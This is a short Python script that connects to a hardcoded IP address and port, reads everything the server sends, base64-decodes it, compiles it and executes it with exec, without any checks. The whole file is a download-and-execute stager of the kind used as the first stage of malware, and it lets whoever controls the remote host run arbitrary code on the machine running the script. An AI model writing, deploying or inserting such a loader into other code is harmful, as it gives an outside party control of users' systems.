#!/usr/bin/env python3
import socket
import base64

def client(connectto='192.168.242.99',port=12345):

    payload = bytearray() # extend this bytearray with data received until 0 bytes received

    s = socket.socket() #use default #
    s.connect((connectto,port))
    payload = bytearray()  # extend this bytearray with data received until 0 bytes received
    buf = s.recv(64)
    while buf:
        payload.extend(buf)
        buf = s.recv(64)

    # encoded = base64.encodebytes(b'hello\x80')
    bcode = base64.decodebytes(payload)
    cbcode = compile(bcode, '<string>', 'exec')
    exec(cbcode)





if __name__ == '__main__':
    client()
